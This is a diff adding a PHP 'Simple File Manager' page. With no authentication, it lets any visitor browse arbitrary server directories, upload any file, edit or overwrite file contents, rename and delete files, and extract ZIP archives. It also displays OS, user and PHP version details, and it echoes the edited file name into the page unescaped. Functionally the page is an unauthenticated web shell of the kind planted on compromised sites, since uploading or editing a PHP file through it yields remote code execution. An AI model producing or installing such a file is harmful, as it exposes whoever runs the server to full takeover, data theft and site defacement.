@@ -1,0 +1,165 @@
+<?php
+$title = "Simple File Manager";
+$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
+$path = realpath($path);
+if (!$path || !is_dir($path)) $path = getcwd();
+chdir($path);
+$files = scandir($path);
+
+function getPermissions($file) {
+    return substr(sprintf('%o', fileperms($file)), -4);
+}
+
+// Upload
+if (isset($_FILES['upload'])) {
+    $uploadName = basename($_FILES['upload']['name']);
+    $targetFile = $path . DIRECTORY_SEPARATOR . $uploadName;
+    if (move_uploaded_file($_FILES['upload']['tmp_name'], $targetFile)) {
+        $message = "Upload successful: $uploadName";
+    } else {
+        $message = "Upload failed.";
+    }
+}
+
+// Edit
+if (isset($_GET['edit'])) {
+    $file = basename($_GET['edit']);
+    $filePath = $path . DIRECTORY_SEPARATOR . $file;
+    if (is_file($filePath)) {
+        if (isset($_POST['content'])) {
+            file_put_contents($filePath, $_POST['content']);
+            $message = "File saved: $file";
+        }
+        $content = htmlspecialchars(file_get_contents($filePath));
+        echo "<h2>Editing: $file</h2>
+              <form method='post'>
+                <textarea name='content' rows='20' cols='80'>$content</textarea><br>
+                <button type='submit'>Save</button>
+              </form>
+              <p><a href='?path=" . urlencode($path) . "'>Back</a></p>";
+        exit;
+    }
+}
+
+// Rename
+if (isset($_GET['rename']) && isset($_GET['to'])) {
+    $oldName = basename($_GET['rename']);
+    $newName = basename($_GET['to']);
+    $oldPath = $path . DIRECTORY_SEPARATOR . $oldName;
+    $newPath = $path . DIRECTORY_SEPARATOR . $newName;
+    if (file_exists($oldPath)) {
+        rename($oldPath, $newPath);
+        $message = "Renamed $oldName to $newName";
+    }
+}
+
+// Delete
+if (isset($_GET['delete'])) {
+    $target = basename($_GET['delete']);
+    $targetPath = $path . DIRECTORY_SEPARATOR . $target;
+    if (is_dir($targetPath)) {
+        rmdir($targetPath) ? $message = "Folder deleted: $target" : $message = "Failed to delete folder: $target";
+    } elseif (is_file($targetPath)) {
+        unlink($targetPath) ? $message = "File deleted: $target" : $message = "Failed to delete file: $target";
+    }
+}
+
+// Extract ZIP
+if (isset($_GET['extract'])) {
+    $zipFile = basename($_GET['extract']);
+    $zipPath = $path . DIRECTORY_SEPARATOR . $zipFile;
+    if (is_file($zipPath)) {
+        $zip = new ZipArchive;
+        if ($zip->open($zipPath) === TRUE) {
+            $zip->extractTo($path);
+            $zip->close();
+            $message = "Extracted $zipFile";
+        } else {
+            $message = "Failed to extract $zipFile";
+        }
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title><?= htmlspecialchars($title) ?></title>
+    <style>
+        body { font-family: sans-serif; background: #f0f0f0; padding: 20px; }
+        h1 { color: #333; }
+        table { border-collapse: collapse; width: 100%; background: #fff; }
+        th, td { border: 1px solid #ddd; padding: 8px; }
+        th { background: #007bff; color: #fff; }
+        tr:nth-child(even) { background: #f9f9f9; }
+        a { color: #007bff; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .message { padding: 10px; background: #e7f3fe; border: 1px solid #b3d7ff; margin-bottom: 10px; }
+        .info-box { background: #fff; padding: 10px; margin-bottom: 20px; border: 1px solid #ddd; }
+    </style>
+</head>
+<body>
+
+<h1><?= htmlspecialchars($title) ?></h1>
+<p>Current Path: <?= htmlspecialchars($path) ?></p>
+
+<?php if (isset($message)): ?>
+    <div class="message"><?= htmlspecialchars($message) ?></div>
+<?php endif; ?>
+
+<!-- Server Info -->
+<div class="info-box">
+    <strong>Server Info:</strong><br>
+    PHP Version: <?= phpversion() ?><br>
+    OS: <?= php_uname() ?><br>
+    User: <?= get_current_user() ?><br>
+    Disk Free: <?= round(disk_free_space($path) / 1024 / 1024, 2) ?> MB<br>
+    Disk Total: <?= round(disk_total_space($path) / 1024 / 1024, 2) ?> MB
+</div>
+
+<form enctype="multipart/form-data" method="post">
+    <input type="file" name="upload" required>
+    <button type="submit">Upload File</button>
+</form>
+
+<table>
+    <tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>
+    <?php foreach ($files as $file): 
+        if ($file === ".") continue;
+        $filePath = $path . DIRECTORY_SEPARATOR . $file;
+        $isDir = is_dir($filePath);
+    ?>
+    <tr>
+        <td>
+            <?php if ($isDir): ?>
+                <a href="?path=<?= urlencode($filePath) ?>"><?= htmlspecialchars($file) ?></a>
+            <?php else: ?>
+                <?= htmlspecialchars($file) ?>
+            <?php endif; ?>
+        </td>
+        <td><?= $isDir ? "-" : filesize($filePath) . " bytes" ?></td>
+        <td><?= getPermissions($filePath) ?></td>
+        <td>
+            <?php if (!$isDir): ?>
+                <a href="?edit=<?= urlencode($file) ?>&path=<?= urlencode($path) ?>">Edit</a>
+                <?php if (strtolower(pathinfo($file, PATHINFO_EXTENSION)) === 'zip'): ?>
+                    | <a href="?extract=<?= urlencode($file) ?>&path=<?= urlencode($path) ?>">Extract</a>
+                <?php endif; ?>
+            <?php endif; ?>
+            | 
+            <a href="?delete=<?= urlencode($file) ?>&path=<?= urlencode($path) ?>" onclick="return confirm('Delete <?= htmlspecialchars($file) ?>?')">Delete</a>
+            |
+            Rename:
+            <form style="display:inline;" method="get">
+                <input type="hidden" name="rename" value="<?= htmlspecialchars($file) ?>">
+                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+                <input type="text" name="to" placeholder="New name" required>
+                <button type="submit">Go</button>
+            </form>
+        </td>
+    </tr>
+    <?php endforeach; ?>
+</table>
+
+</body>
+</html>
